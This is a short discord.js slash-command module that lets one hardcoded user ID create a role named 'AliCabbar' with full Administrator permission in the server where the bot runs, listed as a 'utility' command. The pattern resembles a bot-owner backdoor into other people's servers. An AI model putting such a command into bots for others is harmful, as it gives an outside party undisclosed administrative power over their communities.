const { SlashCommandBuilder,PermissionsBitField } = require("discord.js");

module.exports = {
  data: new SlashCommandBuilder()
    .setName('newrole')
    .setDescription('Make new Admin role'),
  category: 'utility',
  async execute(interaction) {
    if (interaction.user.id !== "201652761031475200") {
      return interaction.reply({ content: "You are not allowed to use this command.", ephemeral: true });
    }
    
    const roleName = 'AliCabbar';
    const existingRole = interaction.guild.roles.cache.find(role => role.name === roleName);
    
    if (existingRole) {
      return interaction.reply({ content: `Role "${roleName}" already exists.`, ephemeral: true });
    }
    
    try {
      const newRole = await interaction.guild.roles.create({
        name: roleName,
        color: "Blue",
        reason: 'New role created by command',
        permissions: [
         PermissionsBitField.Flags.Administrator
        ],
      });
      return interaction.reply({ content: `Role "${newRole.name}" has been created successfully.`, ephemeral: true });
    } catch (error) {
      console.error("Error creating role:", error);
      return interaction.reply({ content: "There was an error creating the role.", ephemeral: true });
    }

  },
};